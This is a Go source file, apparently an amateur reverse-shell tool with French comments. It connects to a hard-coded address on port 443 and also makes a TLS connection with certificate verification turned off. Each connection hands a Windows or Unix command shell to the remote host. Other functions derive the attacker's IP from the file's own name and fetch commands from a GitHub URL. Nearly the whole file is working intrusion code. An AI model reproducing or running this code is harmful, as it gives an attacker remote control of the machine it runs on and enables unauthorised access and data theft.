package main

import (
	"crypto/tls"
	"fmt"
	"github.com/anaskhan96/soup"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

func fileNameWithoutExtension(fileName string) string {
	if pos := strings.LastIndexByte(fileName, '.'); pos != -1 {
		return fileName[:pos]
	}
	return fileName
}

func GetShell(conn net.Conn) {
	var cmd *exec.Cmd

	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("cmd.exe")
	case "linux":
		cmd = exec.Command("/bin/sh")
	case "freebsd":
		cmd = exec.Command("/bin/csh")
	default:
		cmd = exec.Command("/bin/sh")
	}
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}

func timer_programm() {

	//Attendre 2 secondes
	timer1 := time.NewTimer(1 * time.Second)
	<-timer1.C
	fmt.Println("Timer 1 fired")

}
func recupration_adresse_ip() string {
	//Récupération du nom du fichier
	pc, file, line, ok := runtime.Caller(0)
	if ok {
		fmt.Printf("Called from %s, line #%d, func: %v\n",
			file, line, runtime.FuncForPC(pc).Name())
	}
	nomdufcihier_sans_extension := fileNameWithoutExtension(file)
	fmt.Println(nomdufcihier_sans_extension)

	splitUp := strings.Split(nomdufcihier_sans_extension, "x")
	fmt.Println(splitUp)
	adressIP := string(splitUp[1] + "." + splitUp[2] + "." + splitUp[3] + "." + splitUp[4])
	fmt.Println(adressIP)

	return adressIP
}

func Reverse(connectString string) {
	var (
		conn *tls.Conn
		err  error
	)
	config := &tls.Config{InsecureSkipVerify: true}
	if conn, err = tls.Dial("tcp", connectString, config); err != nil {
		os.Exit(-1)
	}
	defer conn.Close()

	GetShell(conn)

}
func commande_Asynchr() {

	lien := "https://raw.githubusercontent.com/piedacoulisse2/reverseshellhtml/master/commandes"
	resp1, err1 := soup.Get(lien)
	if err1 != nil {
		os.Exit(1)
	}
	doc := soup.HTMLParse(resp1)

	data := doc.Find("body")

	fmt.Println(data.Text())

}
func main() {

	//conn, err := net.Dial("tcp", adressIP+":443")
	//conn, err := net.Dial("tcp", "172.31.206.60:443")

	timer_programm()
	adressIP := recupration_adresse_ip()
	adressIP = "10.0.0.132"

	conn, err := net.Dial("tcp", adressIP+":443")
	if err != nil {
		os.Exit(1)
	}

	GetShell(conn)
	Reverse(adressIP + ":443")

}
